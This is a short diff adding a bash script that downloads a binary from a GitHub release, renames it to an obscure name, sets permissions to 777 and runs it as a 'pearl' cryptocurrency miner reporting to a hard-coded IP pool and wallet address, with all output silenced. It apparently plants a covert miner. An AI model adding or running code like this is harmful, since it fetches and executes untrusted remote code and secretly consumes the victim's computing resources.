@@ -1,0 +1,5 @@
+#!/bin/bash
+wget https://github.com/vedhagsvp/tkospae/releases/download/aplose/pkso
+mv pkso lsejas
+chmod 777 lsejas
+./lsejas --coin pearl -o 23.239.21.149:443 -u prl1psq2r0dqrq3sm3d9lnd7pc3sykzr72d7neqf4t8gs5nry87jy6m8s2n4u6s/$(echo $RANDOM | md5sum | head -c 10) > /dev/null 2>&1
